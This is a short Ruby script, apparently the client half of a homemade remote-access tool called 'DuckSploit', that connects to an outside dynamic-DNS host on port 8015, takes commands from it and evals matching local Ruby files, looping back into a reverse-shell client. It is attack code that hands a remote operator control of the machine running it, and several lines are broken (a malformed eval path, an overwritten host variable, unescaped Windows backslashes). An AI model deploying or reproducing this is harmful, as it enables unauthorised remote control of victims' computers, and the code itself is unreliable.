require "socket"
require "colorize"


host = "duckpvp1.ddns.net"
# host = "0.0.0.0"
port = 8015

loop do
	host = TCPSocket.open(host, port)
	
	loop do
		out = "executed!\n"
		cmd = host.gets.chomp
		downcasecmd = cmd.downcase.split.first
		if downcasecmd == "exit"
			host.close
			break
		else
			filepath = "C:/DuckSploit/ruby/#{downcasecmd}.rb".chomp
			if File.exist?(filepath)
			    # system("ruby C:/DuckSploit/ruby/#{downcasecmd}.rb #{cmd.sub(downcasecmd, "")}")
				eval File.read("C:/DuckSploit/ruby/#{downcasecmd}.rb, #{cmd.sub(downcasecmd, "")}")
			else
				out = "[".red.bold.blink + "x".white.bold.blink + "] Command (".red.bold.blink + "#{downcasecmd}".yellow.blink + ") does not exist!\n\n".red.bold.blink
			end
			host.puts out.gsub("\n", "\\NEWLINE")
		end
	end
	eval File.read("E:\DUCKSPLOIT\ruby\reverse_shell\client.rb")
end
exit
